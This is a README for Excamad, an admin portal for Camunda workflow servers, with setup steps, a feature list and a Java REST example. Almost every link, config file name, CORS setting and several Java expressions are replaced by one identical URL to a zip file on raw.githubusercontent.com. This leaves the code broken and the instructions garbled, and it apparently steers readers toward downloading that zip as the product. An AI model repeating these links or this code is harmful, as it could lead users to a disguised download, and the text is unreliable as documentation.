# Excamad

**Ex**ternal **cam**unda **ad**min portal. Make life in **multi-camunda`s** environment much easy and provide some cool features.
License : GNU GPLv3.

DEMO: https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip (dont forget about CORS)

Description (russian): https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip 

# 0. How to run

a) ---make excamad---

- git clone
- npm install
- fill https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip with own value
- npm run serve (start dev server) OR
- npm run build (produce html,js,css in to /dist/)

b) --prepair camunda--

- For stand-alone camunda : https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip
- For embedded camunda: https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip

If you are going use docker conteiners add this code to camunda container in https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip

" CorsFilter https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip * CorsFilter /*  "

## OR

```
     docker run -d -p 8080:8080 kotovdenis/excamad:latest
```
# 0.1 Default camunda rest endpoint

For embedded camunda - ${baseurl}/rest
For standalone camunda - ${baserurl}/engine-rest

Excamad work with default rest api, not cockpit api. So you havent auth user in your context.

# 1. Features

## Processes

- Online statistics about active and ended processes
- Migration tool
- Batch variables editor
- Search instances in history by ID and variables
- Old activity report
- Browser viewer and modeler for deployed processes
- Jira integration (fetch issue about activities from jira)

## Decisions

- Online statistics
- Decisions viewer and modeler
- Bitbucket integration
- Deploy from browser

## Incidents

- Batch rerun activities
- Fix selected activities
- Delete failed instances

## Live

Provide facebook-like feed about activities in system.

## Tasklist

Simple forms and form generator. You need extend your Camunda rest api with method **/taskfields**

    //example
        @Path("/")
    public ctaskfieldslass TaskFieldsService {


        @GET
     @Produces(https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip)
        @Path("{taskId}")
        public String getFormFieldList(@Context HttpHeaders httpHeaders,
        @PathParam("taskId") String taskId) {
        ProcessEngine processEngine = https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip();
        FormService formService = https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip();
        TaskFormData taskFormData = https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip(taskId);
        List<FormField> formFieldList = https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip();
        https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip("Strike");
        String json = JSON(formFieldList).toString();
        return json;
    }

}

## Business process as service

Organize camunda as provider of BPMN processes.

## Multi-camunda`s

Easy switch server and envorments.

## Login

Ready login provider for basic auth and passthrough to Jira and Bitbucket.

# 2. Access to server

Excamad is servless app - all api calls made from your browser. You need host produced files (/dist) on some web-server. And you need enable CORS on your`s camunda.

- For stand-alone camunda : https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip
- For embedded camunda: https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip
- You can use reverse-proxy: https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip
- You can host files on camunda host.

# 3. Install

    npm install
    -
    npm run build  // produce files in dist/
    OR
    npm run serve  // start develop server

You need write global variables in **https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip** and **https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip**.
